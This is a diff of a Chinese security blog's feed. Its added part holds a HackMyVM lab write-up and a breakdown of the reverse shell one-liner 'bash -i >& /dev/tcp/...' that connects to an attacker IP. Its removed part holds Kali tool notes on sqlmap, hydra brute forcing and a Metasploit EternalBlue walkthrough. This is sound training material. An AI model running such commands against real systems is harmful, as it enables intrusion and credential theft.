+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
+<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
+<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -803,6 +1325,15 @@
 <li><strong><code>cap_chown</code></strong><br>  允许程序更改文件的所有者和组。</li>
 <li><strong><code>cap_setuid</code></strong><br>  允许程序更改自己的用户 ID。<br>使用时用&#x2F;usr&#x2F;sbin&#x2F;getcap 这个目录下的权限更高  能找到更多文件</li>
 </ul>
+<h2 id="bash-i-dev-tcp-ip-1234-0-1"><a href="#bash-i-dev-tcp-ip-1234-0-1" class="headerlink" title="bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1"></a>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</h2><p> 反弹shell指令</p>
+<h3 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h3><p>bash 是 Unix 系统上的一个常用 shell（命令行解释器）。bash 可以启动交互式或非交互式 shell。<br>-i 选项使 bash 启动为交互式 shell，这意味着 shell 会尝试从标准输入读取命令并打印标准输出。交互式 shell 还会加载用户的配置文件（例如 .bashrc），使其行为与普通终端相似。</p>
+<h3 id="dev-tcp-192-168-240-83-1234"><a href="#dev-tcp-192-168-240-83-1234" class="headerlink" title="&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234"></a>&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</h3><blockquote>
+<p>&amp; 是 Bash 中用于重定向输出的语法，它将文件描述符从一个地方重定向到另一个地方。<br>&#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 是一个特殊的文件路径，它是 Bash 内置的一种方式，通过 TCP 连接发送和接收数据。它表示一个 TCP 连接，其中 192.168.240.83 是目标 IP 地址，1234 是目标端口号。<br>这种方式允许 Bash 将输出流重定向到一个 TCP 连接，而不是普通的文件或终端。这使得 Bash 可以将输出（如命令的执行结果）发送到远程主机。<br>所以，&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234 将 bash 的标准输出（STDOUT）和标准错误（STDERR）都重定向到目标机器的 IP 地址 192.168.240.83，并通过端口 1234 发送。</p>
+</blockquote>
+<h3 id="0-1"><a href="#0-1" class="headerlink" title="0&gt;&amp;1"></a>0&gt;&amp;1</h3><p>0 代表标准输入（stdin）。</p>
+<blockquote>
+<p>&amp;1 将标准输入重定向到标准输出。这意味着输入流会从 TCP 连接而不是终端接收。<br>通过这一部分，bash 的标准输入（命令输入）会从远程机器的 TCP 连接接收，而不是从用户的终端接收。<br>综合解释<br>整个命令的作用是：<br>启动一个交互式 Bash shell (bash -i)。<br>将标准输出和标准错误输出重定向到一个 TCP 连接，目标 IP 为 192.168.240.83，目标端口为 1234。<br>将标准输入重定向到 TCP 连接，从远程机器接收输入。<br>反向 Shell<br>这行命令的作用就是创建一个反向 shell。受害主机通过 bash 连接到攻击者的机器，并通过一个指定的端口（这里是 1234）与攻击者进行交互：</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>linux</category>
@@ -833,528 +1364,6 @@
       </tags>
   </entry>
   <entry>
-    <title>kali工具笔记</title>
-    <url>/posts/15173.html</url>
-    <content><![CDATA[<p>kali工具笔记</p>
-<span id="more"></span>
-<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>Nmap 是一个强大的端口扫描工具，默认扫描端口范围 1-1024。</p>
-<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-sn</code> 或 <code>-sP</code></td>
-<td>进行主机探测（Ping 扫描）。</td>
-</tr>
-<tr>
-<td>无参数</td>
-<td>更详细的扫描，可以获取端口信息。</td>
-</tr>
-<tr>
-<td><code>-p-</code></td>
-<td>扫描所有端口（有时 Ping 不一定能扫出）。</td>
-</tr>
-<tr>
-<td><code>-p &lt;端口&gt;</code></td>
-<td>指定端口扫描，可与 <code>--script=banner</code> 或 <code>-A</code> 结合使用。</td>
-</tr>
-<tr>
-<td><code>-sU</code></td>
-<td>扫描 UDP 端口，探测目标上的服务。</td>
-</tr>
-<tr>
-<td><code>-A</code></td>
-<td>启用高级检测，包括操作系统检测、版本检测、脚本扫描和路由跟踪。</td>
-</tr>
-<tr>
-<td><code>-sS</code></td>
-<td>进行半开放式（SYN）扫描，适用于快速端口扫描。</td>
-</tr>
-<tr>
-<td><code>-sT</code></td>
-<td>进行完整连接（TCP 连接）扫描，适用于没有特权的用户。</td>
-</tr>
-<tr>
-<td><code>-sV</code></td>
-<td>探测端口服务版本信息。</td>
-</tr>
-<tr>
-<td><code>-O</code></td>
-<td>进行操作系统检测。</td>
-</tr>
-<tr>
-<td><code>--script=&lt;脚本&gt;</code></td>
-<td>使用 Nmap 脚本引擎（NSE），如 <code>--script=vuln</code> 进行漏洞扫描。</td>
-</tr>
-<tr>
-<td><code>-T&lt;0-5&gt;</code></td>
-<td>设置扫描速度，<code>T0</code> 最慢，<code>T5</code> 最快。</td>
-</tr>
-<tr>
-<td><code>-Pn</code></td>
-<td>跳过 Ping 检测，直接扫描目标主机（适用于防火墙屏蔽 Ping 的情况）。</td>
-</tr>
-</tbody></table>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>SQLMap 是一个自动化 SQL 注入漏洞检测工具</p>
-<h3 id="常用参数-1"><a href="#常用参数-1" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-u &lt;URL&gt;</code></td>
-<td>指定目标 URL，例如 <code>-u &quot;http://example.com?id=1&quot;</code>。</td>
-</tr>
-<tr>
-<td><code>--data &quot;&lt;参数&gt;&quot;</code></td>
-<td>用于 POST 请求的参数数据，例如 <code>--data &quot;user=admin&amp;pass=123&quot;</code>。</td>
-</tr>
-<tr>
-<td><code>--cookie &quot;&lt;cookie&gt;&quot;</code></td>
-<td>指定请求的 Cookie，例如 <code>--cookie &quot;PHPSESSID=12345&quot;</code>。</td>
-</tr>
-<tr>
-<td><code>-p &lt;参数&gt;</code></td>
-<td>指定测试的参数，例如 <code>-p id</code> 只测试 <code>id</code> 参数。</td>
-</tr>
-<tr>
-<td><code>--level=&lt;1-5&gt;</code></td>
-<td>设置测试强度，默认 <code>1</code>，<code>5</code> 最彻底但较慢。</td>
-</tr>
-<tr>
-<td><code>--risk=&lt;1-3&gt;</code></td>
-<td>设置风险级别，<code>1</code> 为低，<code>3</code> 为高。</td>
-</tr>
-<tr>
-<td><code>--dbs</code></td>
-<td>枚举目标数据库名称。</td>
-</tr>
-<tr>
-<td><code>--tables</code></td>
-<td>列出目标数据库中的表，需要结合 <code>-D &lt;数据库名&gt;</code> 使用。</td>
-</tr>
-<tr>
-<td><code>--columns</code></td>
-<td>列出表中的列名，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
-</tr>
-<tr>
-<td><code>--dump</code></td>
-<td>导出表中的数据，需要结合 <code>-D &lt;数据库名&gt; -T &lt;表名&gt;</code> 使用。</td>
-</tr>
-<tr>
-<td><code>--batch</code></td>
-<td>跳过交互提示，自动选择默认选项，适用于脚本化操作。</td>
-</tr>
-<tr>
-<td><code>--threads &lt;N&gt;</code></td>
-<td>设置扫描线程数，提高扫描速度（默认为 <code>1</code>，建议 <code>3-5</code>）。</td>
-</tr>
-<tr>
-<td><code>--os-shell</code></td>
-<td>获取操作系统 Shell（如果目标数据库具有命令执行权限）。</td>
-</tr>
-<tr>
-<td><code>--tamper &lt;脚本&gt;</code></td>
-<td>使用 <code>tamper</code> 脚本（如 <code>--tamper=space2comment</code>）绕过某些安全防护。</td>
-</tr>
-</tbody></table>
-<h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> <span class="comment">--dbs</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db <span class="comment">--tables</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users <span class="comment">--columns</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://example.com/index.php?id=1&quot;</span> -D test_db -T users -C xxxx <span class="comment">--dump</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><p>在 Kali Linux 中，<strong>John the Ripper</strong> 是一个强大的密码破解工具，用于测试密码强度</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">john [选项] <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>–wordlist&#x3D;&lt;文件&gt;：指定密码字典。<br>默认字典位置：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt<br>破解结果存储在 ~&#x2F;.john&#x2F;john.pot。</p>
-<h3 id="常用参数-2"><a href="#常用参数-2" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>选项</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>--wordlist=&lt;文件&gt;</code></td>
-<td>使用指定的密码字典进行破解。</td>
-</tr>
-<tr>
-<td><code>--rules</code></td>
-<td>启用规则扩展（对字典进行变形，提高成功率）。</td>
-</tr>
-<tr>
-<td><code>--format=&lt;格式&gt;</code></td>
-<td>指定哈希格式，如 <code>md5crypt</code>、<code>sha512crypt</code>、<code>nt</code>、<code>zip</code>。</td>
-</tr>
-<tr>
-<td><code>--show</code></td>
-<td>显示已破解的密码。</td>
-</tr>
-<tr>
-<td><code>--incremental</code></td>
-<td>使用增量模式（自动生成候选密码）。</td>
-</tr>
-<tr>
-<td><code>--session=&lt;名称&gt;</code></td>
-<td>指定会话名称，可暂停后续继续破解。</td>
-</tr>
-<tr>
-<td><code>--restore=&lt;名称&gt;</code></td>
-<td>恢复指定会话的破解进度。</td>
-</tr>
-<tr>
-<td><code>--fork=&lt;N&gt;</code></td>
-<td>启用 <code>N</code> 个进程进行并行破解，提高速度。</td>
-</tr>
-<tr>
-<td><code>--single</code></td>
-<td>使用用户名作为密码的基础进行单模式破解。</td>
-</tr>
-<tr>
-<td><code>--stdout</code></td>
-<td>仅生成候选密码，不进行破解（测试字典效果）。</td>
-</tr>
-</tbody></table>
-<h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">john <span class="attribute">--wordlist</span>=rockyou.txt <span class="attribute">--format</span>=raw-md5 hashes.txt</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><p><strong>WPScan</strong> 是一个专注于 WordPress 安全性的开源工具，用于扫描 WordPress 网站的安全漏洞。它可以帮助管理员识别网站中可能存在的安全问题，例如已知的插件或主题漏洞、弱密码、以及错误的配置</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">wpscan <span class="attr">--url</span> &lt;target_url&gt; <span class="selector-attr">[选项]</span></span><br></pre></td></tr></table></figure></div>
-<p>现在都需要到官网注册 然后得到api-token 才能获得扫描之后的详细结果</p>
-<h3 id="常用参数-3"><a href="#常用参数-3" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>--url &lt;URL&gt;</code></td>
-<td>指定目标网站的 URL。</td>
-</tr>
-<tr>
-<td><code>--enumerate &lt;OPTION&gt;</code></td>
-<td>枚举 WordPress 的用户、插件、主题等（详细选项见下方）。</td>
-</tr>
-<tr>
-<td><code>--api-token &lt;TOKEN&gt;</code></td>
-<td>使用 WPScan API Token 获取更详细的漏洞数据。</td>
-</tr>
-<tr>
-<td><code>--random-user-agent</code></td>
-<td>使用随机的 User-Agent 模拟真实用户访问，避免被目标网站屏蔽。</td>
-</tr>
-<tr>
-<td><code>--passwords &lt;FILE&gt;</code></td>
-<td>指定密码字典文件，用于密码暴力破解。</td>
-</tr>
-<tr>
-<td><code>--usernames &lt;FILE&gt;</code></td>
-<td>指定用户名字典文件，用于密码暴力破解。</td>
-</tr>
-<tr>
-<td><code>--ignore-main-redirect</code></td>
-<td>忽略网站的 URL 重定向。</td>
-</tr>
-<tr>
-<td><code>--verbose</code></td>
-<td>显示详细的输出信息。</td>
-</tr>
-</tbody></table>
-<p>通过 <code>--enumerate</code> 参数，可以枚举 WordPress 网站的不同组件：</p>
-<table>
-<thead>
-<tr>
-<th>枚举选项</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>u</code></td>
-<td>枚举用户（尝试查找用户名）。</td>
-</tr>
-<tr>
-<td><code>p</code></td>
-<td>枚举插件及其漏洞信息。</td>
-</tr>
-<tr>
-<td><code>t</code></td>
-<td>枚举主题及其漏洞信息。</td>
-</tr>
-<tr>
-<td><code>vp</code></td>
-<td>枚举有漏洞的插件（需要 API 支持）。</td>
-</tr>
-<tr>
-<td><code>vt</code></td>
-<td>枚举有漏洞的主题（需要 API 支持）。</td>
-</tr>
-<tr>
-<td><code>ap</code></td>
-<td>显示所有插件。</td>
-</tr>
-<tr>
-<td><code>at</code></td>
-<td>显示所有主题。</td>
-</tr>
-</tbody></table>
-<p>密码破解</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> https:<span class="string">//example.com</span> -P passwords.txt -U users.txt</span><br></pre></td></tr></table></figure>
-<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p><strong>WFuzz</strong> 是一款开源的 Web 应用模糊测试工具，专为渗透测试设计。它的主要功能是通过暴力破解和模糊测试技术，枚举和发现 Web 应用中的隐藏内容或漏洞，比如：</p>
-<ol>
-<li><strong>目录和文件枚举</strong>：发现网站的隐藏目录或敏感文件。</li>
-<li><strong>参数枚举</strong>：测试 Web 应用中可能存在的隐藏参数。</li>
-<li><strong>凭据爆破</strong>：用于暴力破解登录页面。</li>
-<li><strong>漏洞检测</strong>：检测 SQL 注入、XSS、命令注入等安全漏洞。</li>
-<li><strong>HTTP 请求自定义</strong>：允许用户灵活自定义 HTTP 请求，实现高级模糊测试。<br><strong><code>-u/--url</code></strong>   指定目标 URL，并在其中插入 <code>FUZZ</code> 占位符，WFuzz 会用字典内容替换 <code>FUZZ</code> 进行请求。<br><code>wfuzz -u http://example.com/FUZZ</code><br>默认自带呢位置在&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist</li>
-</ol>
-<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>Binwalk 是一个用于分析文件的工具，常用于隐写分析。</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">binwalk -e &lt;文件&gt; <span class="attribute">--run-as</span>=root</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Dos2Unix"><a href="#Dos2Unix" class="headerlink" title="Dos2Unix"></a>Dos2Unix</h2><p>用于将 Windows 文本文件转换为 Unix 格式。</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dos2unix <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><p>SearchSploit 用于搜索 Exploit-DB 漏洞利用代码。</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="tag">&lt;<span class="name">漏洞或软件名</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>漏洞利用文件存放目录：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Metasploit-msfconsole"><a href="#Metasploit-msfconsole" class="headerlink" title="Metasploit (msfconsole)"></a>Metasploit (msfconsole)</h2><p><code>msfconsole</code> 是 <strong>Metasploit Framework</strong> 的命令行界面，Metasploit 是一个用于开发和执行漏洞利用代码的开源工具。它广泛用于渗透测试、安全评估以及漏洞分析。<code>msfconsole</code> 提供了一个强大的命令行环境，允许用户快速访问各种安全测试功能。<br>以下是一些常见的命令及其说明：</p>
-<h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>show</code></td>
-<td>列出可用的 payloads&#x2F;exploits。</td>
-</tr>
-<tr>
-<td><code>set &lt;选项&gt;</code></td>
-<td>设置攻击参数。</td>
-</tr>
-<tr>
-<td><code>unset &lt;选项&gt;</code></td>
-<td>取消选项设置。</td>
-</tr>
-<tr>
-<td><code>exploit</code></td>
-<td>运行漏洞利用。</td>
-</tr>
-<tr>
-<td><code>sessions</code></td>
-<td>管理会话。</td>
-</tr>
-<tr>
-<td><code>info</code></td>
-<td>查看模块详细信息。</td>
-</tr>
-<tr>
-<td><code>search &lt;名称&gt;</code></td>
-<td>搜索漏洞。</td>
-</tr>
-<tr>
-<td><code>use &lt;模块&gt;</code></td>
-<td>选择漏洞模块。</td>
-</tr>
-<tr>
-<td><code>db_nmap</code></td>
-<td>运行 Nmap 并保存结果。</td>
-</tr>
-<tr>
-<td><code>exit</code> 或 <code>quit</code></td>
-<td>退出 Metasploit。</td>
-</tr>
-</tbody></table>
-<h3 id="使用示例-2"><a href="#使用示例-2" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 启动 Metasploit</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞</span></span><br><span class="line">search smb</span><br><span class="line"><span class="comment"># 该命令搜索与 SMB 相关的漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 选择漏洞模块</span></span><br><span class="line">use exploit<span class="regexp">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line"><span class="comment"># 选择 EternalBlue（MS17-010）漏洞利用模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 查看模块详细信息</span></span><br><span class="line">info</span><br><span class="line"><span class="comment"># 显示当前模块的详细说明和可用选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置攻击目标</span></span><br><span class="line">set RHOSTS <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="comment"># 目标 IP 地址</span></span><br><span class="line"></span><br><span class="line">set RPORT <span class="number">445</span></span><br><span class="line"><span class="comment"># 选择目标端口 445（SMB 端口）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 设置本地攻击机的回连（反向 shell）</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">1.50</span></span><br><span class="line"><span class="comment"># 设置攻击者的 LHOST</span></span><br><span class="line"></span><br><span class="line">set LPORT <span class="number">4444</span></span><br><span class="line"><span class="comment"># 选择本地监听端口 4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 运行漏洞利用</span></span><br><span class="line">exploit</span><br><span class="line"><span class="comment"># 启动漏洞攻击，如果成功，则会获得目标主机的 meterpreter shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 监听和管理会话</span></span><br><span class="line">sessions -l</span><br><span class="line"><span class="comment"># 列出当前活跃的会话</span></span><br><span class="line"></span><br><span class="line">sessions -i <span class="number">1</span></span><br><span class="line"><span class="comment"># 进入 ID 为 1 的会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. 获取系统权限</span></span><br><span class="line">getsystem</span><br><span class="line"><span class="comment"># 尝试提升权限到 SYSTEM 级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10. 获取目标系统信息</span></span><br><span class="line">sysinfo</span><br><span class="line"><span class="comment"># 查看目标系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 11. 获取目标主机的 Shell</span></span><br><span class="line">shell</span><br><span class="line"><span class="comment"># 进入目标系统的命令行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 12. 运行 Nmap 并保存扫描结果</span></span><br><span class="line">db_nmap -sV -p <span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line"><span class="comment"># 扫描 192.168.1.0/24 网络的 80, 443, 445 端口，并保存结果到数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 13. 退出 Metasploit</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># 退出 msfconsole</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Cewl"><a href="#Cewl" class="headerlink" title="Cewl"></a>Cewl</h2><p>Cewl 是一个爬虫工具，可以抓取网站内容并生成密码字典。</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">cewl -w <span class="tag">&lt;<span class="name">输出文件</span>&gt;</span> -d <span class="tag">&lt;<span class="name">深度</span>&gt;</span> <span class="tag">&lt;<span class="name">URL</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><p>使用frackzip破解压缩包</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">fcrackzip</span> -b -c <span class="number">1</span> -l <span class="number">1</span>-<span class="number">6</span> -p <span class="number">0</span> -u <span class="number">1</span>.zip</span><br></pre></td></tr></table></figure></div>
-<p>-b：使用暴力破解模式。</p>
-<p>-c 1：限制密码仅包含数字字符。</p>
-<p>-l 1-6：限制密码长度在 1 到 6 个字符之间。</p>
-<p>-p 0：初始化破解起点为 0。</p>
-<p>-u：显示破解出来的密码。</p>
-<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>Hydra 是一个多协议暴力破解工具。</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">hydra -L <span class="tag">&lt;<span class="name">用户名列表</span>&gt;</span> -P <span class="tag">&lt;<span class="name">密码列表</span>&gt;</span> <span class="tag">&lt;<span class="name">协议</span>&gt;</span>://<span class="tag">&lt;<span class="name">目标</span>&gt;</span>:<span class="tag">&lt;<span class="name">端口</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>支持 SSH、FTP、HTTP 等协议。</p>
-<h3 id="常用参数-5"><a href="#常用参数-5" class="headerlink" title="常用参数"></a>常用参数</h3><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>-L &lt;文件&gt;</code></td>
-<td>指定包含多个用户名的文件。</td>
-</tr>
-<tr>
-<td><code>-L &lt;用户名&gt;</code></td>
-<td>指定单个用户名。</td>
-</tr>
-<tr>
-<td><code>-P &lt;文件&gt;</code></td>
-<td>指定包含多个密码的文件。</td>
-</tr>
-<tr>
-<td><code>-p &lt;密码&gt;</code></td>
-<td>指定单个密码。</td>
-</tr>
-<tr>
-<td><code>-t &lt;线程数&gt;</code></td>
-<td>指定线程数，默认为16。可以增加来提高破解速度，但过高可能会被目标封禁或造成网络问题。</td>
-</tr>
-<tr>
-<td><code>-o &lt;文件&gt;</code></td>
-<td>将破解成功的结果保存到指定文件中。</td>
-</tr>
-</tbody></table>
